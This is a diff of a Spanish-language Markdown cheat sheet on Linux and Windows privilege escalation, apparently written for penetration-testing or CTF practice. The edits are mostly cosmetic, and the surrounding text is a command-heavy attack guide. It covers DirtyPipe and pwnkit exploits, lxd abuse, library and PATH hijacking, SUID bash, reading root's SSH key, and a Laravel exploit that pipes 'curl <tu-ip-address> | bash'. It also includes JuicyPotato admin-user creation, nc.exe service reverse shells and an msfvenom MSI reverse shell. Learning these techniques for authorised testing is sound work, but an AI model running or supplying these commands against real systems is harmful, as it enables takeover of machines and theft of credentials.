@@ -69,7 +69,7 @@ Correr el script en python e indicale la ruta de donde hará el decryp.
 ```
 python3 firefox_decryp.py /ejemplo/directorio/copiado
 ```
-<br>
+<br><br>
 ## DirtyPipe.
 CVE-2022-0847 -> Es una vulnerabilidad que que consiste en cambiar la contraseña del usuario root sobrescribiendo el /etc/passwd.<br> Para ver si un sistema operativo es vulnerable al DirtyPipe lo que se tiene que hacer es ver si tiene instalado el binario gcc. Posteriormente desplazarse a una carpeta que tenga permisos de escritura para poder descargar el exploit(Por lo regular el directorio /tmp siempre cuenta con permisos de escritura). En caso de que la maquina no tenga acceso a internet te puedes copiar el exploit a la clipboard y despues pegarlo en un archivo.c. Por consiguiente buscar en github el exploit referente a la vulnerabilidad, compilar el exploit y al ejecutarlo te lanzará una consola como el usuario root.<br>
 ```
@@ -87,7 +87,7 @@ gcc exploit.c -o exploit 			# Compilar el exploit.c y explortarlo al archivo con
 
 ./exploit					# Ejecutar el exploit
 ```
-<br>
+<br><br>
 ## id.
 Ver a que grupos pertece el usuario actual. En caso de que este dentro del grupo lxd o docker tienes una vía potencial para escalar privilegios en caso de que no este sanitizado.<br>
 Explotación del grupo lxd.
@@ -99,7 +99,6 @@ Explotación del grupo lxd.
 - Te compartes un servicio http por el puerto 80 para traladar el exploit y el alpine.tar.gz a la maquina víctima.
 - Ingresas a un directorio que tenga capacidad de escritura para no tener problemas al traladar el exploitlxd.sh y con wget te tranfieres el exploitlxd.sh y el alpine.tar.gz 
 - Le asignas permisos de ejecución al exploitlxd.sh, lo ejecutas y obtendras una consola como el usuario root.
-
 
 ```
 searchsploit lxd -> linux/local/46978.sh
@@ -115,7 +114,7 @@ wget http://<tu-ip-address>/alpine-v3.16-x86_64-20220817_1533.tar.gz
 chmod +x exploitlxd.sh
 ./exploitlxd.sh
 ```
-<br>
+<br><br>
 ## lsb_release -a (Linux Standard Base).
 Comando utilizado para mostrar toda la información acerca de la distribución de Linux (Sistema Operativo) que se está ejecutando, como su nombre de distibución, versión, codename y descripción.
 ```
@@ -128,13 +127,13 @@ Codename:	stretch
 # -a -> Este parámetro es para mostrar toda la información acerca del sistema operativo.
 ```
 En base a la versión del sistema operativo se pueden buscar vulnerabilidades asociadas y veríficar si se cuentan con los parches de seguridad actualizados.
-<br>
+<br><br>
 ## su root.
 En caso de que tengas contraseñas puedes reutilizarlas con este comando y si son las correctas puedes convertirte en superusuario.
 ```
 su root
 ```
-<br>
+<br><br>
 ## sudo -l.
 Ver si hay binarios que se puedan ejecutar como el usuario root sin proporcionar la contraseña. En caso de encontrar un binario con este comando puedes apoyarte de el sitio web GTFOBins el cual te muestra como puedes llegar a escalar privilegios por medio de un binario.
 ```
@@ -146,8 +145,8 @@ Si al ejecutar el sudo -l vez que el usuario actual tiene todos los privilegios 
 sudo -l -> ALL/ALL
 bash -p 
 ```
-<br>
-## Library Hijacking.
+<br><br>
+## Library Jihacking.
 Consiste en suplantar una librería de python que un script.py importe al ejecutarse.<br>
 ¿Como se realiza esta técnica? Lo primero que tendras que hacer es identificar un script.py que se ejecute en el sistema, abres el script.py y revisas que librerías esta importando el script.py.<br> Una vez que hallaz identificado las librerías que se importan lo que vas a hacer es crear un script.py pero con el nombre de una de las librerías que importa el script. Dentro de la librería que acabas de crear vas a añadir código malicioso que te permita cambiar los privilegios de la bash. Lo que hace el script.py al ejecutarse es que al importar las librerías sigue un orden que depende del path(secuencia de directorios que se recorren para llegar a un archivo). Por lo regular parte de la ruta actual donde se sitúa y de allí recorre los demas directorios en busca de las librerías.<br>
 Entonces si creas una archivo con el nombre de una librería que importe el script.py tomará está primero debido a que esta situada en el mismo lugar que el script.py y esta librería hará lo que tu le indiques dentro del script.<br>
@@ -162,7 +161,7 @@ nvim hashlib.py -> import os
 sudo -u root /usr/bin/python /home/<username>/script.py
 bash -p
 ```
-<br>
+<br><br>
 ## cat /etc/crontab | crontab -l.
 Con este comando puedes ver las tareas cron programadas en el sistema y posteriormente aprovecharte de una de ellas para injectar código malicioso. <br>
 Las tareas cron por lo regular llegar a ser scripts relacionados con correos, bases de datos o comprobación de rutinas programadas con presición para que se ejecuten en una determinada fecha y hora.<br>
@@ -172,11 +171,10 @@ chmod u+s /bin/bash
 chmod 4755 /bin/bash
 watch -c 1 /bin/bash 	# Comando para monitorizar el cambio de permisos en la bash
 ```
-<br>
+<br><br>
 ## find \\-perm -4000 -user root -ls 2>/dev/null.
 Listar aquellos binarios SUID de los cuales el proprietario sea el usuario root y los errores los rediriges al stderr para no verlos en pantalla.<br>
 - ./usr/bin/pkexec (CVE-2021-4034).<br>Con este binario puedes llegar a escalar privilegios con la herramienta pwnkit que se encuentra en github.<br>Lo primero que se tiene que hacer es ver si la máquina víctima cuenta con wget y make. Posteriormente te clonas repositorio de github y lo descomprimes.<br>Desde tu máquina de atacante te compartes un servicio HTTP por el puerto 80 para transferir el pwnkit. Por ultimo te transfieres el pwnkit, ingresas en el, haces un make y lo ejecutas. Al ejecutarlo ganas acceso al sistema como el usuario root.
-
 
 ```
 which wget && which make -> /usr/bin/wget 
@@ -198,9 +196,8 @@ ls -la ./usr/local/bin/backup -> -rwsr-xr-- 1 root admin 16484 Sep  3  2017 ./us
 ```
 groups <username> # Con este comando puedes ver los grupos a los cuales pertenece un usuario.
 ```
-- ./opt/statuscheck.<br>Este es ejemplo de un binario compilado el cual el vulnerable a un <b>Path Hijacking</b>. Con el comando strings puedes listar las cadenas de carácteres imprimibles y la concatenas un less para ver la sálida del comando strings desde el inicio.
-
-
+<b> Path Jihacking.</b>
+- ./opt/statuscheck.<br>Este es ejemplo de un binario compilado el cual el vulnerable a un <b>Path Jihacking</b>. Con el comando strings puedes listar las cadenas de carácteres imprimibles y le concatenas un less para ver la sálida del comando strings desde el inicio.
 ```
 strings ./opt/statuscheck | less 
 
@@ -209,13 +206,13 @@ lib.so.6
 system
 __cxa_finalize
 __libc_start_main
-curl -I H
+curl -I H   <--------- Se ejecuta el binario curl de forma relativa
 http://lH
 ocalhostH
 AWAVA
 AUATL
 ```
-En este caso como se esta ejecutando por détras del binario curl de forma relativa y no absoluta. Entonces como no se toma en cuenta la ruta entera y como el binario el SUID (privilegio 4755), se puede crear un archivo llamado curl que le cambie los privilegios a las bash para ganar acceso como el usuario root.
+En este caso como se esta ejecutando por détras del binario curl de forma relativa y no absoluta (la forma relativa es cuando no se toma en cuenta la ruta desde la raíz). Entonces como no se toma en cuenta la ruta entera y como el binario es SUID (privilegio 4755), se puede crear un archivo llamado curl que le cambie los privilegios a las bash para ganar acceso como el usuario root.
 ```
 touch curl
 chmod +x curl
@@ -237,30 +234,26 @@ ls -l /bin/bash
 
 bash -p		# Ejecutar la bash como el usuario root.
 ``` 
-<br>
+<br><br>
 ## systemctl list-times.
 Ver las tareas que estan a punto de ejecutarse 
-<br>
+<br><br>
 ## getcap -r / 2>/dev/null.
 Listar las capabilities a nivel de sistema de forma recursiva y los errores redirigirlos al stderr para no verlos en pantalla. Las capabilities nos permiten gestionar los permisos que tiene un proceso para accerder al kernel independientemente de quien lo ejecute. Lo que hacen las capabilities es dividir las llamadas de kernel priviligiadas en grupos mas pequeños de privilegios.<br>
 - /usr/bin/perl -> cap_setuid+ep.<br>+ep significa que la capability es efectiva y permitida.<br>
 Esta capability te permite controlar el identificador de usuario para convertirte en usuario root cambiando el uid. Para escalar privilegios lo primero que se hace es asignarle la capability cap_setuid+ep al binario perl y despues se ejecuta una instrucción que te arrogará una consola como root.
-
-
 ```
 setcap cap_setuid+ep perl
 ./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
 ```
 - /usr/bin/tac -> cap_dac_read_search+ei.<br>Esta capability se puede asignar a un binario, en este caso esta asignada al binario tac el cual es un como un cat solo que invierte el output. Con el binario tac puedes ver la id_rsa de un usuario que este dentro del sistema o bien del usuario root para conectarte de forma remota por el puerto 22 (SSH) si se encuentra abierto. Tambien con esta capability puedes salir de un contenedor para conectarte directo al sistema.
-
-
 ```
 tac /root/.ssh/id_rsa | tac -> Se le concatena otro tac para regresar el output a la normalidad.
 ```
-<br>
+<br><br>
 ## ps -faux | ps -e command.
 Listar los procesos que se estan ejecutando.
-<br>
+<br><br>
 ## find / -writable -ls 2>/dev/null.
 Listar aquellos archivos que tengan capacidad de escritura para despues injectarles código malicioso. Puedes usar regex para ir filtrando los archivos.<br>
 ```
@@ -277,14 +270,12 @@ password: <ContraseñaDeCifrado>
 su root
 password: <ContraseñaDeCifrado>
 ```
-<br>
+<br><br>
 ## netstat -nat | ss-nltp.
 Comando para ver los puertos que se encuentran abiertos internamente en el equipo y aplicar un Port Forwarding.<br>El Port Forwarding es básicamente traerte un puerto que se este abierto internamente en la maquina víctima a tu equipo de atacante.<br>
 
 Si al aplicar el comando netstat -nat o ss-nltp logras ver el puerto 8000 abierto y en el esta corriendo laravel que por lo regular laravel corre en ese puerto por default a menos que se modifique, puedes llegar a escalar privilegios sino esta sanitizado.<br>
 - Lo primero tienes que hacer es clonar chisel de github y redudir el peso para que no tarde al transferirlo a la máquina víctima.<br>Te compartes un servicio http con python y transfieres el chisel en un directorio que tenga capacidad de escritura, le asignas permisos de ejecución y lo ejecutas.<br>Te clonas la CVE-2021-3129 de github, ingresas en el directorio creado y te ejecutas el exploit.py.<br>Desde otra ventana te creas un archivo que contenga una reverse shell y compartes un servicio http.<br>En otra ventana te pones en escucha con ncat para que al ejecutar el exploit.py de la CVE-2021-3129 esta hace un curl a tu servicio compartido y te envia una reverse shell al ncat por el puerto 443.
-
-
 ```
 git clone https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_arm64.gz
 cd chisel && go build -ldflags "-s -w" . && upx chisel  # Reducir el peso del chisel.
@@ -309,7 +300,7 @@ git clone CVE-2021-3129
 cd CVE-2021-3129 && ./exploit.py http://localhost:8000 Monolog/RCE1 'curl <tu-ip-address> | bash'
 ```
 Al ejecutarlo ganaras acceso al sistema como el usuario root.
-<br>
+<br><br>
 ## linPEAS.sh.
 linPEAS es una herramienta que te automatiza la escalada de privilegios reportandote aquellas vías potenciales por las cuales puedes llegar a convertirte en usuario root.
 Te clonas el repositorio de github https://github.com/carlospolop/PEASS-ng/releases/tag/20220731 a tu equipo y te comprartes un servicio con python3 para transferir el linPEAS.sh a la máquina víctima.<br>Te transfieres el linPEAS, le das permisos de ejecución y lo ejecutas.<br>Busca por cosas relacionadas con nombres de bases de datos (mysql, mongo etc), passwords, keys, usernames, emails, información que sea delicada.
@@ -321,17 +312,17 @@ wget http://<ip-address/linPEAS.sh			# Desde la máquina víctima
 chmod +x linPEAS.sh
 ./linPEAS.sh
 ```
-<br>
+<br><br>
 ## ESCALADA DE PRIVILEGIOS EN WINDOWS.
 ## systeminfo | reg query.
 Comando para aplicar reconocimiento dentro del equipo y ver la versión del sistema operativo mediante la función reg query.
 ```
 reg query "hklm\software\microsoft\windows nt\currentversion" /v ProductName
 ```
-<br>
+<br><br>
 ## whoami /all.
 Este comando muestra información del token de acceso, el nombre de usuario, los identificadores de seguridad(SID), los privilegios y grupos a los cuales pertenece el usuario actual.
-<br>
+<br><br>
 ## whoami /priv.
 Este comando te permite ver los privilegios que tiene asignado el usuario actual.<br>
 En caso de que el usuario tenga asignado el privilegio SeImpersonatePrivilege puedes llegar a escalar privilegios haciendo uso de la herramienta juicypotato.exe que se encuentra en github.<br>Lo que hace el juicypotato.exe es crear un usuario y despues lo asigna al grupo Administrator para que tenga los privilegios maximos dentro del sistema.<br>
@@ -349,7 +340,7 @@ jp.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net localgroup Administrators 
 jp.exe -t * -p C:\Windows\System32\cmd.exe -a "/c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f" -l 1337
 net user <username> 	# Comando para ver que el usuario creado se haya añadido al grupo Administrators.
 ```
-<br>
+<br><br>
 Despues hay que comprobar que el usuario creado con el juicypotato sea un usuario del sistema con los privilegios de administrador para despues conectarte con psexec.py al sistema como el usuario NT Authority\System.
 ```
 crackmapexec smb -u '<username>' '<password>'	# Si como output te sale un pwn3d! es por que el usuario es administrador del sistema
@@ -363,12 +354,10 @@ jp.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net share smbFolder=C:\Windows
 
 psexec.py WORKGROUP/<username>@<ip-address> cmd.exe
 ```
-<br>
+<br><br>
 ## net user \<username\>.
 Ver a que grupos pertenece un usuario.
 - Si el usuario pertenece al grupo Server Operator se pueden crear, iniciar y detener procesos para escalar privilegios.<br>Crear un proceso (servicio) para que cuando se inicie te envíe una reverse shell a tu equipo por el puerto 443.
-
-
 ```
 sudo rlwrap ncat -nlvp 443	# Ponerte en escucha para recibir la reverse shell.
 
@@ -384,8 +373,6 @@ copy \\<ip-address>\smbFolder\nc.exe			# Desde la máquina víctima.
 upload /ruta/donde/esta/el/nc.exe	# Forma de subir el nc.exe en caso de haber ganado acceso por winrm.
 ```
 - Sino puedes crear un proceso o servicio puedes ver que procesos hay y modificar uno existente. Tendrías que ir probando uno a uno para ver cual puede ser modificado.<br>Una vez modificado un proceso tienes que detener el proceso y volverlo a iniciar y ponerte en escucha con ncat para que cuando se inicie el proceso te envie la reverse shell.
-
-
 ```
 services	# Ver los procesos que se estan ejecutando.
 sc.exe config <name_process> binPath="C:\Windows\Temp\nc.exe -e cmd <ip-address> 443"
@@ -397,7 +384,7 @@ sudo ncat -nlvp 443		# Desde tu equipo.
 
 sc.exe start <name_process>	# Iniciar un servicio.
 ```
-<br>
+<br><br>
 ## winPEAS.exe.
 winPEAS es una herramienta que te ayuda a aplicar reconocimiento en el sistema e identificar posibles vectores por los cuales puedes llegar a escalar priviegios.<br>
 Lo que tienes que hacer es descargar el winPEAS.exe de github para despues transferirlo a la máquina víctima con certutil.exe
@@ -409,8 +396,6 @@ winpeas.exe
 ```
 Ya solo queda buscar por aquelas partes que esten en color rojo ya que representan una forma segura por la cual elevar privilegios.<br>
 - AlwaysInstallElevated.<br>Es una directiva que te permite instalar un paquete de instalador de Windows con privilegios elevados.<br>Si esta directiva se encuentra con un 1 (AlwaysInstallElevated set to 1 in HKLM) puedes crearte un archivo malicioso con msfvenom que contenga una reverse shell para enviarte una consola como el usuario NT Authority\System.
-
-
 ```
 msfvenom -p /window/x64/shell_reverse_tcp LHOST=<ip-address> LPORT=443 --platform windows -a x64 -f msi -o reverse_shell.msi
 # -p = Para especificar el tipo de payload a utilizar.
@@ -426,6 +411,4 @@ certutil.exe -f -urlcache -split http://<ip-address>/reverse_shell.msi reverse.m
 sudo rlwrap ncat -nlvp 443	# Ponerse en escucha para recibir la consola interactiva.
 msexec /quiet /qn /i reverse.msi	# Ejecutar el archivo reverse.msi (Antes de ejecutarlo debes ponerte en escucha con ncat).
 ```
-
-
 
